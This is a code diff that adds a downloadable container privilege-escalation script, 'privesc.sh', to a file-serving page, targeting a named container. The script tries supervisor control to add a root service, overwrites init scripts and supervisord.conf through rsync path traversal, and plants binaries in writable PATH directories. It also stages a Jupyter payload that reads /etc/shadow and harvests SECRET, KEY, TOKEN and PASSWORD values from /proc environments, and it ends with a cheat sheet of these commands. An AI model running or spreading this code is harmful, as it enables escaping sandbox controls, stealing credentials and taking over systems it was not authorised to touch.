@@ -458,7 +458,338 @@ echo "" >> "$SUMMARY_FILE"
 echo "Key Findings:" >> "$SUMMARY_FILE"
 grep -i "error\\|success\\|token\\|access" "$OUTPUT_FILE" | head -10 >> "$SUMMARY_FILE"
 
-log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`
+log "\${BLUE}[INFO]\${NC} Summary saved to: $SUMMARY_FILE"`,
+
+  'privesc': `#!/bin/bash
+
+OUTPUT_FILE="privesc_$(date +%Y%m%d_%H%M%S).log"
+TIMESTAMP=$(date)
+
+# Colors
+RED='\\033[0;31m'
+GREEN='\\033[0;32m'
+YELLOW='\\033[1;33m'
+BLUE='\\033[0;34m'
+NC='\\033[0m'
+
+log() {
+    echo -e "$1" | tee -a "$OUTPUT_FILE"
+}
+
+log_attack() {
+    echo "" | tee -a "$OUTPUT_FILE"
+    echo "===========================================" | tee -a "$OUTPUT_FILE"
+    echo "ATTACK: $1" | tee -a "$OUTPUT_FILE"
+    echo "===========================================" | tee -a "$OUTPUT_FILE"
+}
+
+test_cmd() {
+    local cmd="$1"
+    local description="$2"
+    
+    log "\${BLUE}[TEST]\${NC} $description"
+    log "\${YELLOW}Command:\${NC} $cmd"
+    
+    if eval "$cmd" >> "$OUTPUT_FILE" 2>&1; then
+        log "\${GREEN}[SUCCESS]\${NC} Command executed successfully"
+        return 0
+    else
+        log "\${RED}[FAILED]\${NC} Command failed"
+        return 1
+    fi
+}
+
+exploit_cmd() {
+    local cmd="$1"
+    local description="$2"
+    
+    log "\${RED}[EXPLOIT]\${NC} $description"
+    log "\${YELLOW}Command:\${NC} $cmd"
+    
+    eval "$cmd" | tee -a "$OUTPUT_FILE"
+}
+
+log "\${GREEN}Container Privilege Escalation Script\${NC}"
+log "Started: $TIMESTAMP"
+log "Target: chrome-operator-debian-alpha container"
+
+# ==========================================
+# ATTACK 1: Supervisor Control
+# ==========================================
+log_attack "Supervisor Control Interface"
+
+log "\${BLUE}[INFO]\${NC} Testing supervisor access..."
+if test_cmd "supervisorctl status" "Check supervisor status"; then
+    log "\${GREEN}[FOUND]\${NC} Supervisor control is accessible!"
+    
+    # Try to restart services that run as root
+    log "\${BLUE}[INFO]\${NC} Attempting to restart root services..."
+    
+    # Services that run as root (no user= specified)
+    ROOT_SERVICES=("notebook_server" "rsync_daemon" "sync_share" "chromium" "policy_merge" "certs" "mitmproxy" "test_server" "apply_patch" "container_daemon")
+    
+    for service in "\${ROOT_SERVICES[@]}"; do
+        log "\${BLUE}[TEST]\${NC} Trying to control service: $service"
+        test_cmd "supervisorctl status $service" "Check $service status"
+        test_cmd "supervisorctl restart $service" "Restart $service"
+    done
+    
+    # Try to add new program
+    log "\${BLUE}[EXPLOIT]\${NC} Attempting to add malicious service..."
+    exploit_cmd 'echo "[program:privesc]
+command=/bin/bash -c \\"echo root > /tmp/privesc_test && chmod 777 /tmp/privesc_test\\"
+autostart=true
+user=root" | tee /tmp/malicious_service.conf' "Create malicious service config"
+    
+else
+    log "\${RED}[FAILED]\${NC} No supervisor access"
+fi
+
+# ==========================================
+# ATTACK 2: Init Script Manipulation
+# ==========================================
+log_attack "Init Script File Permissions"
+
+INIT_DIR="/usr/local/init_scripts"
+log "\${BLUE}[INFO]\${NC} Checking init script permissions..."
+
+exploit_cmd "ls -la $INIT_DIR" "List init scripts"
+
+# Check if any scripts are writable
+ROOT_SCRIPTS=("notebook_server.sh" "rsync_daemon.sh" "sync_share.sh" "policy_merge.sh" "certs.sh" "mitmproxy.sh" "test_server.sh" "apply_patch.sh" "container_daemon.sh")
+
+for script in "\${ROOT_SCRIPTS[@]}"; do
+    if [ -w "$INIT_DIR/$script" ]; then
+        log "\${GREEN}[VULNERABLE]\${NC} $script is writable!"
+        
+        # Backup original
+        exploit_cmd "cp $INIT_DIR/$script $INIT_DIR/$script.backup" "Backup original script"
+        
+        # Inject privilege escalation
+        exploit_cmd "echo '#!/bin/bash
+# Privilege escalation payload
+echo \\"Privilege escalation successful at \\$(date)\\" > /tmp/root_access
+chmod 777 /tmp/root_access
+whoami > /tmp/current_user
+id > /tmp/current_id
+# Continue with original script
+' > /tmp/malicious_script.sh" "Create malicious script"
+        
+        log "\${RED}[EXPLOIT]\${NC} Script $script can be modified for privilege escalation!"
+    else
+        log "\${BLUE}[INFO]\${NC} $script is not writable"
+    fi
+done
+
+# ==========================================
+# ATTACK 3: rsync Directory Traversal
+# ==========================================
+log_attack "rsync Directory Traversal"
+
+log "\${BLUE}[INFO]\${NC} Testing rsync write capabilities..."
+
+# Test basic rsync access
+if test_cmd "rsync --list-only rsync://localhost:873/share/" "List rsync share"; then
+    log "\${GREEN}[FOUND]\${NC} rsync is accessible!"
+    
+    # Try directory traversal to overwrite system files
+    log "\${BLUE}[EXPLOIT]\${NC} Attempting directory traversal attacks..."
+    
+    # Create test payload
+    exploit_cmd 'echo "#!/bin/bash
+echo \\"Root access gained via rsync at \\$(date)\\" > /tmp/rsync_privesc
+whoami >> /tmp/rsync_privesc
+id >> /tmp/rsync_privesc
+" > /tmp/malicious_payload.sh && chmod +x /tmp/malicious_payload.sh' "Create rsync payload"
+    
+    # Try to overwrite init scripts via rsync
+    for script in "\${ROOT_SCRIPTS[@]}"; do
+        log "\${BLUE}[TEST]\${NC} Attempting to overwrite $script via rsync..."
+        test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../usr/local/init_scripts/$script" "Overwrite $script"
+    done
+    
+    # Try to overwrite supervisor config
+    log "\${BLUE}[TEST]\${NC} Attempting to overwrite supervisor config..."
+    test_cmd "rsync -av /tmp/malicious_payload.sh rsync://localhost:873/share/../../../etc/supervisord.conf" "Overwrite supervisord.conf"
+    
+    # Try to write to sensitive directories
+    SENSITIVE_DIRS=("etc" "root" "usr/local/bin" "var/log")
+    for dir in "\${SENSITIVE_DIRS[@]}"; do
+        log "\${BLUE}[TEST]\${NC} Testing write access to /$dir..."
+        test_cmd "echo 'test' | rsync --stdin rsync://localhost:873/share/../../../$dir/privesc_test" "Write to /$dir"
+    done
+    
+else
+    log "\${RED}[FAILED]\${NC} rsync not accessible"
+fi
+
+# ==========================================
+# ATTACK 4: Jupyter Code Execution
+# ==========================================
+log_attack "Jupyter Notebook Exploitation"
+
+log "\${BLUE}[INFO]\${NC} Testing Jupyter access..."
+
+# Test if Jupyter is accessible
+if test_cmd "curl -s http://localhost:8888/ | head -5" "Check Jupyter accessibility"; then
+    log "\${GREEN}[FOUND]\${NC} Jupyter is accessible!"
+    
+    # Create Python payload for file system manipulation
+    exploit_cmd 'cat > /tmp/jupyter_exploit.py << '"'"'EOF'"'"'
+import os
+import subprocess
+import sys
+
+# Try to write to system directories
+print("=== Jupyter Privilege Escalation Test ===")
+print(f"Current user: {os.getenv('"'"'USER'"'"')}")
+print(f"Current working directory: {os.getcwd()}")
+
+# Try to execute system commands
+try:
+    result = subprocess.run(['"'"'whoami'"'"'], capture_output=True, text=True)
+    print(f"whoami output: {result.stdout.strip()}")
+except Exception as e:
+    print(f"Error running whoami: {e}")
+
+# Try to write to /tmp with different permissions
+try:
+    with open('"'"'/tmp/jupyter_privesc_test'"'"', '"'"'w'"'"') as f:
+        f.write("Jupyter code execution successful\\n")
+    print("Successfully wrote to /tmp")
+except Exception as e:
+    print(f"Error writing to /tmp: {e}")
+
+# Try to read sensitive files
+sensitive_files = ['"'"'/etc/shadow'"'"', '"'"'/etc/passwd'"'"', '"'"'/root/.bashrc'"'"']
+for file in sensitive_files:
+    try:
+        with open(file, '"'"'r'"'"') as f:
+            content = f.read()[:100]  # First 100 chars
+            print(f"Can read {file}: {len(content)} chars")
+    except Exception as e:
+        print(f"Cannot read {file}: {e}")
+
+# Try to modify supervisor scripts
+init_scripts = ['"'"'/usr/local/init_scripts/notebook_server.sh'"'"', 
+                '"'"'/usr/local/init_scripts/rsync_daemon.sh'"'"']
+for script in init_scripts:
+    try:
+        with open(script, '"'"'r'"'"') as f:
+            content = f.read()
+            print(f"Can read {script}: {len(content)} chars")
+        
+        # Try to write
+        with open(script, '"'"'a'"'"') as f:
+            f.write("\\n# Jupyter modification test\\n")
+            print(f"Successfully modified {script}")
+    except Exception as e:
+        print(f"Cannot modify {script}: {e}")
+EOF' "Create Jupyter exploitation script"
+    
+    log "\${BLUE}[INFO]\${NC} Jupyter payload created. Manual execution required:"
+    log "1. Access http://localhost:8888 in browser"
+    log "2. Create new Python notebook"
+    log "3. Copy and execute the content of /tmp/jupyter_exploit.py"
+    
+else
+    log "\${RED}[FAILED]\${NC} Jupyter not accessible"
+fi
+
+# ==========================================
+# ATTACK 5: Environment Variable Exploitation
+# ==========================================
+log_attack "Environment Variable Exploitation"
+
+log "\${BLUE}[INFO]\${NC} Checking for exploitable environment variables..."
+
+# Check MITM proxy credentials
+exploit_cmd "env | grep MITM" "MITM environment variables"
+
+# Check for PATH manipulation possibilities
+exploit_cmd "echo \\$PATH" "Current PATH"
+
+# Try to create malicious binaries in PATH directories
+PATH_DIRS=$(echo $PATH | tr ':' '\\n')
+for dir in $PATH_DIRS; do
+    if [ -w "$dir" ]; then
+        log "\${GREEN}[VULNERABLE]\${NC} $dir is writable in PATH!"
+        exploit_cmd "echo '#!/bin/bash
+echo \\"PATH exploitation successful\\" > /tmp/path_exploit
+whoami >> /tmp/path_exploit
+' > $dir/malicious_binary && chmod +x $dir/malicious_binary" "Create malicious binary in $dir"
+    fi
+done
+
+# ==========================================
+# ATTACK 6: Process Injection via /proc
+# ==========================================
+log_attack "Process Memory Analysis"
+
+log "\${BLUE}[INFO]\${NC} Analyzing running processes for exploitation..."
+
+# Look for processes running as root
+exploit_cmd "ps aux | grep root | head -10" "Root processes"
+
+# Check process environments for credentials
+ROOT_PIDS=$(ps aux | grep root | grep -v '\\[' | awk '{print $2}' | head -5)
+for pid in $ROOT_PIDS; do
+    if [ -r "/proc/$pid/environ" ]; then
+        log "\${BLUE}[INFO]\${NC} Checking environment of PID $pid..."
+        exploit_cmd "cat /proc/$pid/environ | tr '\\\\0' '\\\\n' | grep -E '(SECRET|KEY|TOKEN|PASSWORD)'" "Environment of PID $pid"
+    fi
+done
+
+# ==========================================
+# SUMMARY AND RECOMMENDATIONS
+# ==========================================
+log ""
+log "=========================================="
+log "PRIVILEGE ESCALATION SUMMARY"
+log "=========================================="
+
+log "\${BLUE}[INFO]\${NC} Exploitation attempts completed at $(date)"
+log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"
+
+# Check if any exploits were successful
+if [ -f "/tmp/privesc_test" ] || [ -f "/tmp/rsync_privesc" ] || [ -f "/tmp/jupyter_privesc_test" ]; then
+    log "\${GREEN}[SUCCESS]\${NC} Potential privilege escalation achieved! Check /tmp/ for evidence."
+else
+    log "\${YELLOW}[INFO]\${NC} No immediate privilege escalation detected."
+fi
+
+log ""
+log "\${BLUE}Next steps:\${NC}"
+log "1. Check supervisor logs: tail -f /var/log/chrome.supervisord.log"
+log "2. Monitor service restarts for exploitation opportunities"
+log "3. Use Jupyter notebook for interactive privilege escalation"
+log "4. Examine /tmp/ directory for exploitation artifacts"
+
+# Create a quick reference
+cat > /tmp/privesc_commands.txt << 'EOF'
+# Quick Privilege Escalation Commands
+
+# Supervisor control
+supervisorctl status
+supervisorctl restart notebook_server
+
+# rsync exploitation
+rsync --list-only rsync://localhost:873/share/
+echo "payload" | rsync --stdin rsync://localhost:873/share/../../../tmp/test
+
+# File permission checks
+ls -la /usr/local/init_scripts/
+find /usr/local -perm -002 -type f
+
+# Process analysis
+ps aux | grep root
+cat /proc/*/environ | grep -i secret
+
+# Jupyter access
+curl http://localhost:8888/
+EOF
+
+log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/privesc_commands.txt"`
 };
 
 // Function to get HTML content (files page only)
@@ -576,6 +907,10 @@ async function getHTMLContent() {
                 <li class="file-item">
                     <a href="/files/azure-enum" class="file-link" style="color: #0078d4; font-weight: bold;">☁️ azure-enum.sh</a>
                     <div class="file-desc">Azure Container IAM and Metadata Enumeration - IMDS queries, managed identity checks, Azure CLI enumeration, credential discovery</div>
+                </li>
+                <li class="file-item">
+                    <a href="/files/privesc" class="file-link" style="color: #dc3545; font-weight: bold;">🔓 privesc.sh</a>
+                    <div class="file-desc">Container Privilege Escalation Testing - supervisor control, init script manipulation, rsync traversal, Jupyter exploitation, process injection</div>
                 </li>
             </ul>
         </div>
